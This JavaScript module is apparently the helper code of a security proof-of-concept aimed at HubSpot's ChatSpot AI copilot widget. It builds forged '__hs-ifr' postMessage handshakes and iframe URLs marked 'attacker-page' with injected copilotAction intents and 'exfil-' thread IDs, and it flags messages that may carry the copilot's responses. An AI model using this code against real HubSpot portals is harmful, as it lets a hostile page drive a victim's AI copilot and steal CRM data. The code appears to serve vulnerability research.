/**
 * Utility functions extracted from index.html (ChatSpot PoC).
 * Message building, config parsing, and message classification helpers.
 */

const HS_IFR = '__hs-ifr';

/**
 * Encode a copilot action object the way index.html builds them.
 */
function buildCopilotAction(intent, extra) {
  return encodeURIComponent(
    JSON.stringify(Object.assign({ intent }, extra))
  );
}

/**
 * Build a SYNC handshake message.
 */
function buildSyncMessage(embedId) {
  return {
    format: HS_IFR,
    from: 'HOST',
    to: embedId,
    v: 1,
    payload: {
      type: 'SYNC',
      embedId,
      group: 'iframeable',
      name: 'embed',
      appData: {},
      embeddedProps: {},
    },
  };
}

/**
 * Build a generic __hs-ifr envelope.
 */
function buildHsIfrMessage(payloadType, extra, chatspotId) {
  return {
    format: HS_IFR,
    from: 'HOST',
    to: chatspotId || '*',
    v: 1,
    payload: Object.assign({ type: payloadType }, extra),
  };
}

/**
 * Classify an incoming __hs-ifr message by its payload type.
 */
function classifyMessage(data) {
  if (!data) return null;
  if (data.format !== HS_IFR) return 'NON_IFR';
  const payload = data.payload || {};
  return payload.type || data.type || 'UNKNOWN';
}

/**
 * Determine the object-type label from a select value.
 */
function objectTypeLabel(objectTypeId) {
  switch (objectTypeId) {
    case '0-1': return 'Contact';
    case '0-2': return 'Company';
    case '0-3': return 'Deal';
    default: return 'Unknown';
  }
}

/**
 * Build the ChatSpot iframe URL.
 */
function buildChatspotUrl(portalId, copilotAction, threadId) {
  let url =
    `https://app-eu1.hubspot.com/chatspot-widget-ui/${portalId}/chat` +
    `?hostAppName=attacker-page` +
    `&copilotThreadId=${threadId || 'exfil-' + Date.now()}`;
  if (copilotAction) {
    url = `https://app-eu1.hubspot.com/chatspot-widget-ui/${portalId}/chat` +
      `?copilotAction=${copilotAction}` +
      `&hostAppName=attacker-page` +
      `&copilotThreadId=${threadId || 'exfil-' + Date.now()}`;
  }
  return url;
}

/**
 * Check whether an incoming capability payload might contain response data
 * (heuristic used by the PoC to flag interesting messages).
 */
function capabilityMayContainData(argsStr) {
  if (!argsStr || argsStr.length <= 100) return false;
  return (
    argsStr.includes('text') ||
    argsStr.includes('content') ||
    argsStr.includes('message') ||
    argsStr.includes('response')
  );
}

module.exports = {
  HS_IFR,
  buildCopilotAction,
  buildSyncMessage,
  buildHsIfrMessage,
  classifyMessage,
  objectTypeLabel,
  buildChatspotUrl,
  capabilityMayContainData,
};
